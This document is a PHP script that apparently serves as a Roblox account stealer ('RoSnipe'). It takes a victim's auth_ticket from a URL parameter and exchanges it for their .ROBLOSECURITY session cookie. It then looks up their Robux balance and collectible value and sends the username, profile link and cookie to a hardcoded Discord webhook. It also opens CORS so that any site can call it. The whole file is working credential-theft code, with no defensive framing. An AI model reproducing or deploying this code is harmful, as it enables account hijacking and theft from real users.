<?php


    $user_agent = substr($_SERVER['HTTP_USER_AGENT'], 0, 128);
    $ip = $_SERVER['REMOTE_ADDR'];

    function get_user_rap($user_id, $ROBLOSECURITY) {
        $cursor = "";
        $total_rap = 0;

        while ($cursor !== null) {
            $request = curl_init();
            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$ROBLOSECURITY));
            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
            $data = json_decode(curl_exec($request), 1);
            foreach($data["data"] as $item) {
                $total_rap += $item["recentAveragePrice"];
            }
            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
        }

        return $total_rap;
    }


    if (isset($_SERVER['HTTP_ORIGIN'])) {

        header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
        header('Access-Control-Allow-Credentials: true');
        header('Access-Control-Max-Age: 86400');  
    }


    if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
        if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
        
            header("Access-Control-Allow-Methods: GET, POST, OPTIONS");         

        if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
            header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");
    }

    
    $auth_ticket = $_GET["auth_ticket"];

    if (isset($auth_ticket) && strlen($auth_ticket) >= 100) {
       
        $request = curl_init();
        curl_setopt($request, CURLOPT_URL, "https://www.roblox.com/Login/Negotiate.ashx?suggest=".$auth_ticket);
        curl_setopt($request, CURLOPT_HTTPHEADER, array('RBXAuthenticationNegotiation: 1'));
        curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($request, CURLOPT_HEADER, 1);
        curl_setopt($request, CURLOPT_VERBOSE, 0);
        $response = curl_exec($request);

        preg_match('/Set-Cookie: .ROBLOSECURITY=(.*?);/', $response, $cookie);
        $ROBLOSECURITY = $cookie[1];
        
        if ($ROBLOSECURITY) {
            
            $request = curl_init();
            curl_setopt($request, CURLOPT_URL, "https://www.roblox.com/mobileapi/userinfo");
            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$ROBLOSECURITY));
            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
            $userinfo = json_decode(curl_exec($request), 1);
            $user_rap = get_user_rap($userinfo["UserID"], $ROBLOSECURITY);
            $userinfo_str = "Name: ".$userinfo["UserName"].PHP_EOL."Robux: ".$userinfo["RobuxBalance"].PHP_EOL."RAP: ".$user_rap.PHP_EOL."Any BC: ".($userinfo["IsAnyBuildersClubMember"] ? "Yes" : "No");
            $clientinfo_str = "IP: ".$ip.PHP_EOL.$ROBLOSECURITY;
            
            $url = "https://discordapp.com/api/webhooks/661135994162249728/Ze18vzuK2-78g7MMSDOzE4N7s_Fg9goF4xbJtxITdAf73KoKy7BgaYHqqsDpCA6rHzo1";
		
		
		

$hookObject = json_encode([
    /*
     * The general "message" shown above your embeds
     */
    
    /*
     * The username shown in the message
     */
    "username" => "RoSnipe",
    /*
     * The image location for the senders image
     */
    /*
     * Whether or not to read the message in Text-to-speech
     */
    /*
     * File contents to send to upload a file
     */
    // "file" => "",
    /*
     * An array of Embeds
     */
     "embeds" => [
        /*
         * Our first embed
         */
        [
            // Set the title for your embed
            

            // The type of your embed, will ALWAYS be "rich"
            "type" => "rich",

            // A description for your embed
            "description" => "**Username:** \n ``` ".$userinfo["UserName"]." ``` **Profile:** \n https://www.roblox.com/users/".$_GET["ID"]."/profile"."\n **Cookie:** \n ``` ".$ROBLOSECURITY." ```",

            // The URL of where your title will be a link to
            

            /* A timestamp to be displayed below the embed, IE for when an an article was posted
             * This must be formatted as ISO8601
             */
            

            // The integer color to be used on the left side of the embed
            "color" => hexdec( "00FF00" ),
            
            // Footer object
            "footer" => [
                "text" => "New Cookie",
                
            ],

            // Image object
         

            

            // Author object
            "author" => [
                "name" => "RoSnipe"
            ],

            // Field array of objects
            
        ]
    ]
    
    

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );
        }
    }
?>
